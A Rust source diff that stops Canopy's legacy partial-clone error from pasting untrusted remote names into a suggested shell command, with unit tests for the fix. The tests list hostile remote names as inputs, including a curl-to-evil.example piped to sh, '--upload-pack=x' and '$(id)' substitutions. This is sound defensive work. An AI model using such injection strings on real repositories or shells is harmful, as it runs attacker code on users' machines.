@@ -71,16 +71,36 @@ pub enum Error {
 
     /// A partial clone made by Git before 2.24 records its promisor remote in
     /// `extensions.partialClone`, a repository extension libgit2 refuses to open.
-    #[error(
-        "This partial clone uses the old extensions.partialClone setting, which Canopy cannot \
-         open. Git 2.24 and newer record the same thing as remote.{remote}.promisor; to convert \
-         it, run `git config remote.{remote}.promisor true` and then \
-         `git config --unset extensions.partialClone` in the repository."
-    )]
+    #[error("{}", legacy_partial_clone_message(.remote))]
     LegacyPartialClone {
         /// The promisor remote named by `extensions.partialClone`.
         remote: String,
     },
+}
+
+/// The message for [`Error::LegacyPartialClone`]. The remote name comes from the repository's own
+/// configuration and the message is meant to be copied into a shell, so it names a command only
+/// for a plain remote name.
+fn legacy_partial_clone_message(remote: &str) -> String {
+    let plain = !remote.is_empty()
+        && !remote.starts_with('-')
+        && remote
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'));
+    let what = "This partial clone uses the old extensions.partialClone setting, which Canopy \
+                cannot open. Git 2.24 and newer record the same thing as remote.<name>.promisor";
+    if plain {
+        format!(
+            "{what}; to convert it, run `git config remote.{remote}.promisor true` and then \
+             `git config --unset extensions.partialClone` in the repository."
+        )
+    } else {
+        format!(
+            "{what}; to convert it, edit the repository's .git/config: set promisor = true on \
+             the remote that extensions.partialClone names, then remove that setting. Its name \
+             is not shown because it is not a plain remote name."
+        )
+    }
 }
 
 fn not_downloaded_message(remote: Option<&str>, reason: Option<&str>) -> String {
@@ -108,5 +128,48 @@ impl Error {
 
     pub(crate) fn invalid(msg: impl Into<String>) -> Self {
         Self::Invalid(msg.into())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn legacy(remote: &str) -> String {
+        Error::LegacyPartialClone {
+            remote: remote.to_owned(),
+        }
+        .to_string()
+    }
+
+    #[test]
+    fn legacy_partial_clone_names_a_plain_remote_in_the_command() {
+        let msg = legacy("origin");
+        assert!(
+            msg.contains("`git config remote.origin.promisor true`"),
+            "{msg}"
+        );
+    }
+
+    #[test]
+    fn legacy_partial_clone_never_prints_an_odd_remote_name_as_a_command() {
+        // The name comes from the repository's own configuration, and the message is meant to be
+        // copied into a shell.
+        for remote in [
+            "x; curl evil.example/p.sh | sh; #",
+            "--upload-pack=x",
+            "a b",
+            "$(id)",
+            "a`id`",
+            "a\nb",
+            "",
+        ] {
+            let msg = legacy(remote);
+            assert!(!msg.contains("git config remote."), "{remote:?}: {msg}");
+            assert!(
+                remote.is_empty() || !msg.contains(remote),
+                "{remote:?}: {msg}"
+            );
+        }
     }
 }
